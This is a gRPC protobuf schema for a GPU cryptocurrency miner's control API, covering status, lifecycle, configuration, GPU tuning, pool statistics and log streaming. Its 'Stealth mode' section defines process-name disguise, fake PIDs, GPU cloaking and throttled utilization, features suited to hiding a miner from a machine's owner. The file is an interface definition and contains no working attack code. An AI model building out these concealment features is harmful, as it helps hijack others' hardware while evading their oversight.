// Protocol Buffers definition for OPUS-GPU miner gRPC API
// miner.proto: gRPC service definitions cho miner control

syntax = "proto3";

package miner.v1;

option go_package = "github.com/opus-gpu/gpu-tools/api/proto/miner/v1;minerv1";

// ============================================================================
// MinerService - Main gRPC service (service chính)
// ============================================================================
service MinerService {
  // Health and status
  rpc GetStatus(GetStatusRequest) returns (GetStatusResponse);
  rpc GetHealth(GetHealthRequest) returns (GetHealthResponse);

  // Lifecycle management
  rpc StartMiner(StartMinerRequest) returns (StartMinerResponse);
  rpc StopMiner(StopMinerRequest) returns (StopMinerResponse);
  rpc RestartMiner(RestartMinerRequest) returns (RestartMinerResponse);

  // Configuration
  rpc ReloadConfig(ReloadConfigRequest) returns (ReloadConfigResponse);
  rpc GetConfig(GetConfigRequest) returns (GetConfigResponse);
  rpc UpdateConfig(UpdateConfigRequest) returns (UpdateConfigResponse);

  // Stealth mode
  rpc SetStealth(SetStealthRequest) returns (SetStealthResponse);
  rpc GetStealthStatus(GetStealthStatusRequest) returns (GetStealthStatusResponse);

  // GPU management
  rpc ListGPUs(ListGPUsRequest) returns (ListGPUsResponse);
  rpc GetGPUStats(GetGPUStatsRequest) returns (GetGPUStatsResponse);
  rpc ResetGPU(ResetGPURequest) returns (ResetGPUResponse);
  rpc SetGPUSettings(SetGPUSettingsRequest) returns (SetGPUSettingsResponse);

  // Mining statistics
  rpc GetMiningStats(GetMiningStatsRequest) returns (GetMiningStatsResponse);
  rpc GetPoolStats(GetPoolStatsRequest) returns (GetPoolStatsResponse);

  // Logs streaming
  rpc StreamLogs(StreamLogsRequest) returns (stream LogEntry);
  rpc StreamMetrics(StreamMetricsRequest) returns (stream MetricEntry);
}

// ============================================================================
// Status Messages (Thông điệp trạng thái)
// ============================================================================

message GetStatusRequest {}

message GetStatusResponse {
  bool running = 1;
  bool ready = 2;
  int32 pid = 3;
  int64 uptime_seconds = 4;
  double total_hashrate = 5;
  int64 shares_accepted = 6;
  int64 shares_rejected = 7;
  repeated GPUStatus gpus = 8;
  PoolStatus pool = 9;
}

message GPUStatus {
  int32 id = 1;
  string name = 2;
  double hashrate = 3;
  int32 temperature = 4;
  int32 power_draw = 5;
  int32 memory_used = 6;
  int32 fan_speed = 7;
  string status = 8;  // idle, mining, error
}

message PoolStatus {
  string url = 1;
  bool connected = 2;
  int64 accepted_shares = 3;
  int64 rejected_shares = 4;
  int32 ping_ms = 5;
}

message GetHealthRequest {}

message GetHealthResponse {
  bool healthy = 1;
  repeated HealthCheck checks = 2;
}

message HealthCheck {
  string name = 1;
  bool passed = 2;
  string message = 3;
}

// ============================================================================
// Lifecycle Messages (Thông điệp vòng đời)
// ============================================================================

message StartMinerRequest {
  string config_path = 1;
  string wallet = 2;
  string pool = 3;
  map<string, string> overrides = 4;  // Config overrides
}

message StartMinerResponse {
  int32 pid = 1;
  string message = 2;
}

message StopMinerRequest {
  int32 timeout_seconds = 1;  // Graceful shutdown timeout
  bool force = 2;  // Force kill if true
}

message StopMinerResponse {
  string message = 1;
}

message RestartMinerRequest {
  int32 delay_seconds = 1;  // Delay before restart
}

message RestartMinerResponse {
  string message = 1;
}

// ============================================================================
// Configuration Messages (Thông điệp cấu hình)
// ============================================================================

message ReloadConfigRequest {
  string config_yaml = 1;
}

message ReloadConfigResponse {
  bool success = 1;
  string message = 2;
  repeated string validation_errors = 3;
}

message GetConfigRequest {}

message GetConfigResponse {
  string config_yaml = 1;
}

message UpdateConfigRequest {
  string config_yaml = 1;
  bool validate_only = 2;  // Validate without applying
}

message UpdateConfigResponse {
  bool success = 1;
  string message = 2;
  repeated string validation_errors = 3;
}

// ============================================================================
// Stealth Mode Messages (Thông điệp chế độ ẩn danh)
// ============================================================================

message SetStealthRequest {
  bool enabled = 1;
}

message SetStealthResponse {
  bool success = 1;
  string message = 2;
}

message GetStealthStatusRequest {}

message GetStealthStatusResponse {
  bool enabled = 1;
  StealthConfig config = 2;
}

message StealthConfig {
  string process_name = 1;
  bool fake_pid = 2;
  bool gpu_cloaking = 3;
  int32 target_utilization = 4;
}

// ============================================================================
// GPU Management Messages (Thông điệp quản lý GPU)
// ============================================================================

message ListGPUsRequest {}

message ListGPUsResponse {
  repeated GPUInfo gpus = 1;
}

message GPUInfo {
  int32 id = 1;
  string name = 2;
  string compute_capability = 3;
  int64 total_memory = 4;
  string bus_id = 5;
  string status = 6;
}

message GetGPUStatsRequest {
  int32 gpu_id = 1;
}

message GetGPUStatsResponse {
  int32 id = 1;
  string name = 2;
  string status = 3;
  double hashrate = 4;
  int32 temperature = 5;
  int32 fan_speed = 6;
  int32 power_draw = 7;
  int32 power_limit = 8;
  int32 clock_speed = 9;
  int32 memory_used = 10;
  int32 memory_total = 11;
  int32 utilization = 12;
  int32 memory_utilization = 13;
}

message ResetGPURequest {
  int32 gpu_id = 1;
}

message ResetGPUResponse {
  bool success = 1;
  string message = 2;
}

message SetGPUSettingsRequest {
  int32 gpu_id = 1;
  GPUSettings settings = 2;
}

message SetGPUSettingsResponse {
  bool success = 1;
  string message = 2;
}

message GPUSettings {
  optional int32 power_limit = 1;
  optional int32 core_clock = 2;
  optional int32 memory_clock = 3;
  optional int32 fan_speed = 4;
}

// ============================================================================
// Mining Statistics Messages (Thông điệp thống kê mining)
// ============================================================================

message GetMiningStatsRequest {
  int32 duration_seconds = 1;  // Stats for last N seconds (0 = all-time)
}

message GetMiningStatsResponse {
  double average_hashrate = 1;
  double current_hashrate = 2;
  int64 total_shares = 3;
  int64 accepted_shares = 4;
  int64 rejected_shares = 5;
  int64 stale_shares = 6;
  double acceptance_rate = 7;
  int64 uptime_seconds = 8;
  repeated GPUMiningStats gpu_stats = 9;
}

message GPUMiningStats {
  int32 gpu_id = 1;
  double hashrate = 2;
  int64 shares = 3;
  int64 errors = 4;
}

message GetPoolStatsRequest {}

message GetPoolStatsResponse {
  string pool_url = 1;
  bool connected = 2;
  int32 connection_uptime_seconds = 3;
  int32 ping_ms = 4;
  int64 jobs_received = 5;
  int64 reconnect_count = 6;
}

// ============================================================================
// Streaming Messages (Thông điệp streaming)
// ============================================================================

message StreamLogsRequest {
  int32 tail = 1;  // Number of lines to show
  string level = 2;  // Filter by log level
  string module = 3;  // Filter by module
  bool follow = 4;  // Follow mode
}

message LogEntry {
  int64 timestamp = 1;
  string level = 2;
  string module = 3;
  string message = 4;
  map<string, string> fields = 5;
}

message StreamMetricsRequest {
  repeated string metric_names = 1;  // Filter by metric names
  int32 interval_seconds = 2;  // Update interval
}

message MetricEntry {
  int64 timestamp = 1;
  string name = 2;
  double value = 3;
  map<string, string> labels = 4;
}
